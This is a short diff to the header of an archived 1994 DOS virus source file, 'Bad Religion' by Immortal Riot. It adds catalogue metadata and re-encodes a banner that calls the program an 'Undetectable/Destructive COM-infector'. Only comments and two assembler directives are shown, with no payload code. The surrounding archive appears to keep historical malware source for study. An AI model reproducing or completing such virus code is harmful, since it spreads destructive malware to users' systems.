@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; ------------------------------------------------------------------------------
 ;
 ;                        - Bad Religion -
@@ -5,7 +16,7 @@
 ;              (c) 1994 The Unforgiven/Immortal Riot 
 ;
 ; ------------------------------------------------------------------------------
-;               þ Undetectable/Destructive COM-infector þ
+;               ï¿½ Undetectable/Destructive COM-infector ï¿½
 ; ------------------------------------------------------------------------------
 .model tiny
 .radix 16
